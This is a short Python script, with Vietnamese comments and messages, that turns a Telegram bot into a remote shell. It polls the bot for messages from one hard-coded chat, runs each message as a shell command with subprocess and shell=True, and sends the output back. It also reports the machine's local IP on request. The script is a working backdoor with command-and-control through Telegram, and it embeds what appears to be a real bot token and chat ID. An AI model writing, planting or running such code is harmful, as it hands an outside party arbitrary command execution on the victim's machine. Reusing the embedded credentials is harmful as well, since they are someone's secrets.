import requests
import subprocess
import time
import socket

BOT_TOKEN = "7916172515:AAF1e1Nj8K_F8Xr2LGQyLTKBlYTn9ZlOrIU"
CHAT_ID = "5197540151"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return f"Error getting IP: {e}"

def get_updates():
    global last_update_id
    params = {"timeout": 100, "offset": last_update_id}
    response = requests.get(f"{API_URL}/getUpdates", params=params)
    return response.json()

def send_message(text):
    requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text})

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e)
    return output.strip()

def main():
    global last_update_id
    while True:
        updates = get_updates()
        for update in updates.get("result", []):
            last_update_id = update["update_id"] + 1
            message = update.get("message", {})
            text = message.get("text", "")
            sender = message.get("chat", {}).get("id", "")

            if str(sender) != CHAT_ID:
                continue  # Bỏ qua nếu không phải tin nhắn từ bạn

            if text.lower() == "ip":
                ip = get_local_ip()
                send_message(f"📶 Local IP: {ip}")
            else:
                output = run_command(text)
                if output:
                    send_message(f"📥 Kết quả:\n{output}")
                else:
                    send_message("❌ Không có đầu ra.")

        time.sleep(1)

if __name__ == "__main__":
    main()
